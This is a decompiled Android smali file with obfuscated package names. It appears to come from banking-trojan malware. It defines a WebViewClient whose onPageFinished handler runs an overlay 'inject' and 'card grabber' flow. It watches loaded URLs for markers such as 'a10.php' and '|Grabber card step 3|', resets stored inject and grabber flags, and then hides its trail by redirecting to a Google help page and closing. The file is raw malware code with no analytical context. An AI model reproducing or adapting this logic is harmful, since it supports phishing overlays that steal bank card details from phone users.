.class Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;
.super Landroid/webkit/WebViewClient;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "b"
.end annotation


# instance fields
.field final synthetic a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;


# direct methods
.method private constructor <init>(Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$1;)V
    .locals 0

    invoke-direct {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;-><init>(Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;)V

    return-void
.end method


# virtual methods
.method public onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
    .locals 4

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Start Activity Inject"

    invoke-virtual {v0, v1, p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "a10.php"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "STOP"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v2, "save_inj"

    const-string v3, ""

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v2, "lock_inj"

    const-string v3, ""

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v2, "timeStartGrabber"

    const-string v3, ""

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v2, "name"

    const-string v3, "false"

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android"

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    :cond_0
    const-string v0, "STOP"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android"

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    invoke-virtual {v0}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->finish()V

    :cond_1
    const-string v0, "exitdagjhadfjedgjsfhexitlgdgsfhafg"

    invoke-virtual {p2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "https://support.google.com/calendar/answer/6261951?hl=en&co=GENIE.Platform=Android"

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    invoke-virtual {p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->finish()V

    :cond_2
    const-string p1, "|Grabber card step 3|"

    invoke-virtual {p2, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_3

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v0, "save_inj"

    const-string v1, ""

    invoke-virtual {p1, p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v0, "lock_inj"

    const-string v1, ""

    invoke-virtual {p1, p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v0, "timeStartGrabber"

    const-string v1, ""

    invoke-virtual {p1, p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi$b;->a:Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    const-string v0, "name"

    const-string v1, "false"

    invoke-virtual {p1, p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_3
    return-void
.end method

.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .locals 0

    const/4 p1, 0x0

    return p1
.end method
